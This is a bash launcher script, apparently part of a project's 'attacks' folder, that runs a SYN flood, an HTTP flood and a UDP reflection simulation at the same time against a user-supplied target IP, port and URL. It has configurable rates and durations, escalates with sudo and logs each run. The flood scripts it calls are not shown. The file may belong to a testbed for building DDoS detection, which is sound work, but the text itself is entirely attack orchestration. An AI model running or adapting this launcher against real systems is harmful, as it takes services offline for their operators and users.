#!/bin/bash

sudo -v || exit 1

if [[ "$1" == "--help" || "$1" == "-h" ]]; then
    cat <<EOF
Usage: bash attacks/run_mixed_attack.sh [options]
Options:
  --target-ip IP        Target IP
  --target-port PORT    Target port
  --target-url URL      Target URL
  --duration SEC        Duration
  --syn-rate RATE       SYN rate
  --http-rate RATE      HTTP rate
  --udp-rate RATE       UDP rate
  --output-dir DIR      Log dir
  -h, --help            Show help
EOF
    exit 0
fi


while [[ $# -gt 0 ]]; do
    case "$1" in
        --target-ip) TARGET_IP="$2"; shift ;;
        --target-port) TARGET_PORT="$2"; shift ;;
        --target-url) TARGET_URL="$2"; shift ;;
        --duration) DURATION="$2"; shift ;;
        --syn-rate) SYN_RATE="$2"; shift ;;
        --http-rate) HTTP_RATE="$2"; shift ;;
        --udp-rate) UDP_RATE="$2"; shift ;;
        --output-dir) OUTPUT_DIR="$2"; shift ;;
        *) exit 1 ;;
    esac
    shift
done

mkdir -p "$OUTPUT_DIR"

sudo python3 attacks/syn_flood.py \
--target-ip "$TARGET_IP" \
--target-port "$TARGET_PORT" \
--duration "$DURATION" \
--rate "$SYN_RATE" \
--output "$OUTPUT_DIR/syn_flood.log" &

python3 attacks/http_flood.py \
--target-url "$TARGET_URL" \
--duration "$DURATION" \
--rate "$HTTP_RATE" \
--output "$OUTPUT_DIR/http_flood.log" &

sudo python3 attacks/udp_reflection_sim.py \
--target-ip "$TARGET_IP" \
--target-port "$TARGET_PORT" \
--duration "$DURATION" \
--rate "$UDP_RATE" \
--output "$OUTPUT_DIR/udp_reflection.log" &

wait
